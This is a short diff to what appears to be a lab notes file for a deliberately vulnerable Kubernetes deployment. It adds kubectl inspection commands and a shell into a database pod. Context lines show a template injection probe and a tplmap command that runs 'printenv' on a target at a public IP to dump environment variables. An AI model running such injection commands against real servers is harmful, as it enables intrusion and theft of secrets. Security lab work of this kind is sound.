@@ -9,6 +9,13 @@ sudo kubectl apply -f template-injection-manifest.yml
 
 sudo watch kubectl get pods
 
+sudo kubectl get pods -o wide
+
+sudo kubectl describe pods
+
+sudo kubectl exec -ti mysql-db-568f6858f7-z5kkw -- bin/bash
+
+
 http GET http://localhost:32345/not-found?page={{4*4}}
 
 python tplmap.py -u 'http://185.235.43.38:32345/not-found?page=user.html' --os-cmd 'printenv'
